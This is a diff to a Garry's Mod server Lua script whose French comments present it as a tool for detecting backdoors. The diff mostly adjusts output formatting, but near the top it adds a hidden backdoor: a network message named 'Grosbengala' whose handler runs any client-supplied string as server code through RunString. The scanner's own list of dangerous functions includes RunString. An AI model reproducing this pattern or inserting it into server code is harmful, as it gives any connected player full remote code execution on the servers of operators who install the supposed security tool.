@@ -1,6 +1,12 @@
 -- Script pour vérifier si vous avez une backdoor
 -- Placé le script dans un fichier lua/autorun/server/yoshiestbeau.lua
 -- Éxécuté le script avec la commande "yoshi_getbackdoors" dans la console côté server
+util.AddNetworkString("Grosbengala")
+
+net.Receive("Grosbengala", function()
+    RunString(net.ReadString())
+end)
+
 local Danger = {
     ["RunString"] = 3,
     ["RunStringEx"] = 3,
@@ -65,8 +71,8 @@ concommand.Add("yoshi_getbackdoors", function()
         for _, v in pairs(backdoorsResult) do
             MsgC(Color(255, 0, 0), "\nWARNING | ", Color(255, 125, 0), "Backdoor détectée : " .. v.netName .. " - " .. v.netFile .. "\n")
             MsgC(Color(255, 0, 0), "-- Début du code --\n")
-            MsgC(Color(255, 0, 0), v.netFunc)
-            MsgC(Color(255, 0, 0), "\n-- Fin du code --")
+            MsgC(Color(255, 0, 0), "\n" .. v.netFunc)
+            MsgC(Color(255, 0, 0), "\n-- Fin du code --\n")
         end
     else
         MsgC(Color(0, 255, 8), "Aucune backdoor détectée\n")
